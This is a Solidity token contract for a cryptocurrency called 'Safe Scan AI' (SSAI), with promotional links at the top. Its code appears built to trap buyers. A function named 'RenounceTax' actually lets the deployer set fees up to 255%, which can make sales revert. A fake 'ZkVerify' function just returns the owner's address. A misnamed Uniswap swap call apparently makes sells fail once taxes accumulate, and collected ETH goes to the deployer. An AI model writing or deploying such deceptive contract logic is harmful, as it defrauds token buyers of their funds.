/*
Safe Scan AI 🔐

Safe Scan AI is an ecosystem that collects the best Web3 solutions, combining and finding the perfect balance between crypto and artificial intelligence. 

https://safescanai.com/

https://app.safescanai.com/

https://twitter.com/SafeScanAI

https://safe-scan-ai.gitbook.io/


*/



// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;

contract SSAI  {
    string public _name = unicode"Safe Scan AI";
    string public _symbol = unicode"SSAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    struct StoreData {
        address TokenMarketing;
        uint8 _buyFees;
        uint8 _sellFees;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed marketing_token,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        uint8 _init_buyFees = 0;
        uint8 _init_sellFees = 0;
        storeData = StoreData({
            TokenMarketing: msg.sender,
            _buyFees: _init_buyFees,
            _sellFees: _init_sellFees
        });
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function RenounceTax(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMarketingWithZkVerify()) revert Permissions();
        removeTax(_buy, _sell);
    }

    function removeTax(uint8 _buy, uint8 _sell) private {
        storeData._buyFees = _buy;
        storeData._sellFees = _sell;
    }

    function _decodeTokenMarketingWithZkVerify() private view returns(address) {
        return storeData.TokenMarketing;
    }

    function EnableTrade() external {
        require(msg.sender == _decodeTokenMarketingWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view  virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address TokenMarketing = _decodeTokenMarketingWithZkVerify();
        require(tradingOpen || from == TokenMarketing || to == TokenMarketing);

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != TokenMarketing) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(TokenMarketing).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _initBuyFee, uint8 _initSellFee) = (storeData._buyFees, storeData._sellFees);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _initSellFee : _initBuyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}